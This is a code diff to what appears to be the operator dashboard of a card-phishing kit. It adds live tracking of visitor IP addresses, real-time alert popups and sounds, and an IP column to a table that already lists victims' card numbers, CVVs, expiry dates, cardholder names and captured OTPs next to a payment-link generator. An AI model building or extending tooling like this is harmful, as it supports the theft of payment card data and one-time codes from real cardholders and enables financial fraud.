@@ -91,6 +91,62 @@
       margin-bottom: 15px;
       display: none;
     }
+    /* Visitors section */
+    .visitors-container {
+      background: #222;
+      padding: 20px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+    .visitor-item {
+      display: flex;
+      align-items: center;
+      padding: 10px;
+      border-bottom: 1px solid #333;
+      animation: highlight 3s ease-out;
+    }
+    .visitor-badge {
+      background: #ef4444;
+      color: white;
+      padding: 2px 8px;
+      border-radius: 10px;
+      font-size: 12px;
+      margin-right: 10px;
+    }
+    .ip-address {
+      background: #333;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-family: monospace;
+      margin-right: 10px;
+    }
+    .visitor-time {
+      color: #aaa;
+      font-size: 12px;
+      margin-left: auto;
+    }
+    /* Animation for new visitors */
+    @keyframes highlight {
+      0% { background-color: #ef4444; }
+      100% { background-color: transparent; }
+    }
+    .notification {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: #ef4444;
+      color: white;
+      padding: 15px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+      z-index: 1000;
+      animation: slideIn 0.3s ease-out;
+      max-width: 350px;
+    }
+    @keyframes slideIn {
+      0% { transform: translateX(100%); opacity: 0; }
+      100% { transform: translateX(0); opacity: 1; }
+    }
   </style>
 </head>
 <body>
@@ -99,6 +155,14 @@
 
     <div id="error-msg" class="error-message"></div>
     <div id="success-msg" class="success-message"></div>
+
+    <!-- Visitors Section -->
+    <div class="visitors-container">
+      <h2>Active Visitors</h2>
+      <div id="visitors-list">
+        <p>No visitors yet</p>
+      </div>
+    </div>
 
     <div class="generate-link">
       <h2>Generate Payment Link</h2>
@@ -138,6 +202,7 @@
           <th>CVV</th>
           <th>Expiry</th>
           <th>Cardholder</th>
+          <th>IP Address</th>
           <th>OTP</th>
           <th>Status</th>
           <th>Actions</th>
@@ -152,6 +217,7 @@
     // Global Variables
     const socket = io();
     let transactionsMap = new Map();
+    let visitorsMap = new Map();
 
     // Show error or success message
     function showMessage(type, message, duration = 5000) {
@@ -162,6 +228,25 @@
       // Auto hide after duration
       setTimeout(() => {
         element.style.display = 'none';
+      }, duration);
+    }
+
+    // Show notification
+    function showNotification(message, duration = 5000) {
+      const notification = document.createElement('div');
+      notification.className = 'notification';
+      notification.textContent = message;
+      document.body.appendChild(notification);
+      
+      // Play sound
+      const audio = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-alert-quick-chime-766.mp3');
+      audio.play();
+      
+      // Auto remove after duration
+      setTimeout(() => {
+        notification.style.opacity = '0';
+        notification.style.transform = 'translateX(100%)';
+        setTimeout(() => notification.remove(), 300);
       }, duration);
     }
 
@@ -255,7 +340,7 @@
         tbody.innerHTML = '';
 
         if (data.length === 0) {
-          tbody.innerHTML = `<tr><td colspan="11" style="text-align:center">No transactions found</td></tr>`;
+          tbody.innerHTML = `<tr><td colspan="12" style="text-align:center">No transactions found</td></tr>`;
           return;
         }
 
@@ -270,6 +355,7 @@
             <td>${tx.cvv}</td>
             <td>${tx.expiry}</td>
             <td>${tx.cardholder}</td>
+            <td><span class="ip-address">${tx.ip || 'Unknown'}</span></td>
             <td>
               ${tx.otpEntered ?
                 `<span class="otp-received">${tx.otpEntered}</span>
@@ -318,6 +404,56 @@
         console.error('Error loading transactions:', error);
         showMessage('error', 'Failed to load transactions');
         document.getElementById('transactionsLoading').style.display = 'none';
+      }
+    }
+
+    // Load visitors
+    async function loadVisitors() {
+      try {
+        const response = await fetch('/api/visitors');
+        if (!response.ok) {
+          throw new Error('Failed to load visitors');
+        }
+        
+        const data = await response.json();
+        const visitorsList = document.getElementById('visitors-list');
+        
+        if (data.length === 0) {
+          visitorsList.innerHTML = '<p>No visitors yet</p>';
+          return;
+        }
+        
+        visitorsList.innerHTML = '';
+        data.forEach(visitor => {
+          visitorsMap.set(visitor.pid, visitor);
+          addVisitorToList(visitor, false);
+        });
+      } catch (error) {
+        console.error('Error loading visitors:', error);
+      }
+    }
+    
+    // Add visitor to list
+    function addVisitorToList(visitor, isNew = true) {
+      const visitorsList = document.getElementById('visitors-list');
+      const visitorItem = document.createElement('div');
+      visitorItem.className = 'visitor-item';
+      if (isNew) {
+        visitorItem.style.animation = 'highlight 3s ease-out';
+      }
+      
+      visitorItem.innerHTML = `
+        <span class="visitor-badge">VISITOR</span>
+        <span class="ip-address">${visitor.ip || 'Unknown'}</span>
+   <span>Payment ID: ${visitor.pid}</span>
+        <span class="visitor-time">${visitor.timestamp}</span>
+      `;
+      
+      // Add to beginning of list for new visitors
+      if (isNew) {
+        visitorsList.insertBefore(visitorItem, visitorsList.firstChild);
+      } else {
+        visitorsList.appendChild(visitorItem);
       }
     }
 
@@ -489,11 +625,33 @@
     socket.on('new_transaction', () => {
       loadTransactions();
     });
+    
+    // Handle visitor notifications
+    socket.on('visitor', (visitor) => {
+      // Add visitor to map
+      visitorsMap.set(visitor.pid, visitor);
+      
+      // Add to list with highlight animation
+      addVisitorToList(visitor, true);
+      
+      // Show notification
+      showNotification(`New visitor from IP: ${visitor.ip}`);
+      
+      // Play notification sound
+      try {
+        const audio = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-alert-quick-chime-766.mp3');
+        audio.play();
+      } catch (e) {
+        console.log('Could not play notification sound', e);
+      }
+    });
 
     // Initial Load
     document.addEventListener('DOMContentLoaded', () => {
       loadTransactions();
-      setInterval(loadTransactions, 10000); // Refresh every 10 seconds
+      loadVisitors();
+      setInterval(loadTransactions, 10000); // Refresh transactions every 10 seconds
+      setInterval(loadVisitors, 30000); // Refresh visitors every 30 seconds
     });
   </script>
 </body>
